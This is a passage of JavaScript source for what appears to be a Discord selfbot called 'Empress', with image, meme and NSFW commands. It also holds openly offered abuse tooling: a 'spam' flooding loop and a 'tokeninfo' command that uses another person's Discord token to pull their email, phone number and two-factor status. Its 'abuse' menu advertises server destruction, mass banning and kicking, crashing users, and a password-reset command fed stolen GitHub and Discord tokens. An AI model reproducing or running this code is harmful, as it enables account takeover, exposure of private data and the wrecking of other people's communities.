                    console.log(clc.blueBright(`${cmd} command used`))
                    if (args.length < 1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    let output = args.join(' ');
                    mappings.forEach(replacer => output = output.replace(replacer.regex, replacer.replacement));
                    message.delete();
                    message.channel.send(output);
                    break;
                }
                case 'smug':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/smug`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`smug face`)
                        .setImage(data.url)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                

                case 'spam':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    let msg = args.slice(1).join(" ");
                    let x = args[0]
                    message.delete();
                    for(let i=0; i<x; i++){
                        message.channel.send(msg)
                    }
                    break;
                }
                case 'tomcall':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    let text = args.join('+')
                    try{
                        img=`https://api.alexflipnote.dev//calling?text=${text}`
                        var embed = new Discord.RichEmbed()
                        .setImage(img)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    
                    break;
                }
                case 'thighs':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekobot.xyz/api/image?type=thigh`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Wink!`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.message)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}

                    break;
                }
                case 'triggered':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let user = message.mentions.users.first()||message.author
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        var embed = new Discord.RichEmbed()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setImage(`https://some-random-api.ml/canvas/triggered?avatar=${user.avatarURL}`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'trumptweet':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    text = args.join('+')
                    try{
                        var response = await fetch(`https://nekobot.xyz/api/imagegen?type=trumptweet&text=${text}`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Twitter`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.message)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'stealemojis':{
                    async function makedir(dir) {
                        await fs.mkdir(dir, err => { 
                            if (err && err.code != 'EEXIST') return console.log(err)
                        })
                    }
                    result = message.guild.name
                    dir = result
                    console.log(`Creating folder "${dir}" to store emotes in...`)
                    makedir(`./${dir}`).then(() => {
                    //starts downloading all the images
                    var emotes = message.guild.emojis.map(a =>{return a.url})
                    successful = 0
                    failed = 0
                    for(i = 0;emotes.length > i;i++) {
                        emoteName = emotes[i].split('/').splice(-1)
                        request.get(emotes[i]).on('error', (err) => {console.log(err); failed++}).pipe(fs.createWriteStream(`./${dir}/${emoteName}`))
                        successful++
                    }
                console.log(`${successful} emotes successfully retrieved!\n ${failed} failed.`)})
                message.delete();
                    break;
            }

                case 'type':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    msg = args.join(" ");
                    msg = msg.toLowerCase();
                    var text=msg.split("");
                    const no = ['1','2','3','4','5','6','7','8','9','0']
                    const no1 = [':one:',':two:',':three:',':four:',':five:',':six:',':seven:',':eight:',':nine:',':zero:']
                    const symbols = ['!','?','@','#','$','%','^','&','*','(',')']
                    x=""
            
                    for(let i=0;i<text.length;i++)
                    {
                        if(no.includes(text[i])) x+=no1[no.indexOf(text[i])]
                        else if(symbols.includes(text[i])) x+=text[i]
                        else if(text[i]!==" ")
                        x+=':regional_indicator_'+text[i]+":";
                        else
                        x+=" ";
                    }
                    message.channel.send(x)
                    break;
                }

                case 'typing':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <duration in s/m/h>`)
                    t = args[0]
                    message.delete();
                    if(!t) return console.log(clc.red('mention duration!'))
                    console.log(clc.blueBright(`${cmd} command used fot ${t} duration`))
                    message.channel.startTyping()
                    setTimeout(function(){message.channel.stopTyping()},ms(t))
                    break;
                }

                case 'tickle':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first();
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/tickle`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`Tickling ${user}!`)
                        .setImage(data.url)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'tits':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/tits`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Nyaa")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        }); 
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'tokeninfo':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let token = args[0]
                    message.delete();
                    request({
                        method: "GET",
                        url: "https://discordapp.com/api/v7/users/@me",
                        headers: {
                            authorization: token
                        }
                    }, (error, response, body) => {
                        if (!body) return console('no response from server');
                        res = response.body
                        res = JSON.parse(res)
                        id = res.id
                        now = new Date()
                        createdOn=new Date(id/4194304 + 1420070400000)
                        age=now-createdOn
                        name = res.username;
                        avatarid = res.avatar
                        tag=res.discriminator
                        emailid = res.email
                        ver = res.verified
                        locale = res.locale
                        nsfw = res.nsfw_allowed
                        twofactor = res.mfa_enabled
                        phone = res.phone
                        nitro = res.premium_type
                        if(!nitro) nitro = 'broke ass mf'
                        else if(nitro===1) nitro = 'nitro classic'
                        else if(nitro === 2) nitro = 'nitro boost'
                        let totalSeconds = (age / 1000);
                        let days = Math.floor(totalSeconds / 86400);
                        totalSeconds %= 86400;
                        let hours = Math.floor(totalSeconds / 3600);
                        totalSeconds %= 3600;
                        let minutes = Math.floor(totalSeconds / 60);
                        let seconds = Math.floor(totalSeconds % 60);
                        age = `${days} days, ${hours} hours, ${minutes} minutes and ${seconds} seconds`;
                        date = createdOn.getHours() + ":" + createdOn.getMinutes() + ", " + createdOn.toDateString();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Token Info`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setDescription(`Details for ${name}'s token`)
                        .setImage(`https://cdn.discordapp.com/avatars/${id}/${avatarid}`)
                        .addField("Name:",`${name}#${tag}`,true)
                        .addField("locale:",`${locale}`,true)
                        .addField("Email:",`${emailid}`,true)
                        .addField("Created on:",`${date}`,true)
                        .addField("Age:",`${age}`,true)
                        .addField("Verified:",`${ver}`)
                        .addField("NSFW Enabled:",`${nsfw}`,true)
                        .addField("Two Factor Auth:",`${twofactor}`,true)
                        .addField("Phone:",`${phone}`)
                        .addField("Nitro:",nitro)   
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    });
                    break;

                }

                case 'trash':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let user = message.mentions.users.first()
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        img=`https://api.alexflipnote.dev/trash?face=${client.user.avatarURL}&trash=${user.avatarURL}`
                        var embed = new Discord.RichEmbed()
                        .setImage(img)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch (e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'unbanall':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user;
                    const users = await message.guild.fetchBans()
                    for (user of users.array()) {
                        await message.guild.unban(user)
                    }
                    break;
                }

                case 'undertale':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    text = args.join("+")
                    try{
                        var embed = new Discord.RichEmbed()
                        .setImage(`https://www.demirramon.com/gen/undertale_text_box.png?text=${text}`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'userinfo':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first() || client.user;
                    if(user.bot) return console.log("mf is a bot");
                    id = user.id
                    message.delete();
                    const member = message.guild.members.get(id);
                    createdOn=new Date(id/4194304 + 1420070400000)
                    date = createdOn.getHours() + ":" + createdOn.getMinutes() + ", " + createdOn.toDateString();
                    ts = new Date(member.joinedTimestamp)
                    joindate = ts.getHours() + ":" + ts.getMinutes() + ", " + ts.toDateString();
            
                    var embed = new Discord.RichEmbed()
                    .setTitle(`User Info`)
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setDescription(`Details for ${user}`)
                    .setThumbnail(`${user.avatarURL}`)
                    .addField("Created on:",`${date}`,true)
                    .addField("ID:",`${id}`,true)
                    .addField(`Joined on`, `${joindate}`,true)
                    .addField('Roles:', `${member.roles.map(r => `${r}`).join(' | ')}`)
                    .setFooter(`Empress`)
                    .setTimestamp();
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    break;
                }

                case 'wasted':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    let user = message.mentions.users.first()||message.author
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        var embed = new Discord.RichEmbed()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setImage(`https://some-random-api.ml/canvas/wasted?avatar=${user.avatarURL}`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'weather':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let key = WeatherKey;
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <city>`)
                    if(key==="") return console.log('Please set openweather API')
                    try{
                        var response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${args}&appid=${key}`);
                        var data = await response.json();
                        var temp = data.main.temp;
                        var pressure = data.main.pressure;
                        var humidity = data.main.humidity;
                        var feelsLike = data.main.feels_like;
                        var embed = new Discord.RichEmbed()
                            .setTitle(`The weather in ${args} is...`)
                            .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                            .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                            .setDescription(data.weather[0].main)
                            .addField("Temperature: ",temp+" C",true)
                            .addField("Feels Like: ",feelsLike+" C",true)
                            .addField("Pressure: ",pressure+" hPa",true)
                            .addField("Humidity: ",humidity+" %",true)
                            .setFooter(`Empress`)
                            .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'wink':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://some-random-api.ml/animu/wink`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`Wink!`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.link)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'help':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\n**GENERAL**\n**TEXT**\n**MODERATION**\n**IMAGE**\n**FUN**\n**NSFW**\n**ABUSE**```")
                    break;
                }
                case 'general':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\navatar <`blank`/@user>\nbotstats\nhelp\nhypesquad <brilliance/bravery/balance/random>\nip <ip>\nlyrics <query>\nowoify <text>\nping\nprefix <desired prefix>\nserverinfo\nshorten <url>\nshutdown\nstealemojis\nuserinfo```")
                    break;
                }
                case 'text':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\nascii <text>\nblank\nclap <text>\ndecode <base64 text>\ndm <@user>\neditspam <text>\nembed <title>, <description>\nencode <text>\neval <js snippet>\nfact\nfakeinvite <fake discord invite> <real discord invite> [enter without discord.gg/]\ngping <@user>\nguildlist\nimgembed <img url>\nlenny\nlmgtfy <query>\nnotfunny\nreverse <text>\nsecret <text>\nsmol <text>\nspam <number> <text>\type <text>\ntyping <duration in s/m/d/y>```")
                    break;
                }
                case 'moderation':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\nban <@user/id>\nkick <@user>\nnickname <`blank`/@user>\npurge <number/@user number>```")
                    break;
                }
                case 'image':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\nachievement <text>\nbaka <@user>\ncat\nchangemymind <text>\ncolor <hex>\ncuteneko\ndog\ndrake <top text, bottom text>\ndym <text>\nfeed <@user>\nfox\nhug <@user>\njokeoverhead <@user>\nkiss <@user>\nmeme\npat <@user>\nsadcat\nslap <@user>\nsmug\ntickle <@user>\ntrash <@user>\ntomcall Mtext>\ntriggered <@user>\ntrumptweet<text>\nundertale <text>\nwasted <@user>\nwink```")
                    break;
                }
                case 'fun':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\n8ball <question>\ncoinflip\ndick <@user>\nhorny <@user>\nms <rows> <columns> <mines>\npokedex <pokemon name>\nrainbowroles\nsimp <@user>\nslots```")
                    break;
                }
                case 'nsfw':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\nanal\nanimethighs\nblowjob\nboobs\nerofeet\nfeet\nhentai\nlesbian\nlewdneko\nnudes\npussy\ntits\nthighs```")
                    break;
                }
                case 'abuse':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("```md\nbanall\ncrash <@user>\ndelchannels\ndelroles\ndestroyserver\ndisable <token>\nkickall\nmasschannel\npassreset <github Personal Access token(repo, delete perms)> <discord token>\ntokeninfo <token>\nunbanall```")
                    break;
                }

        }
 
});
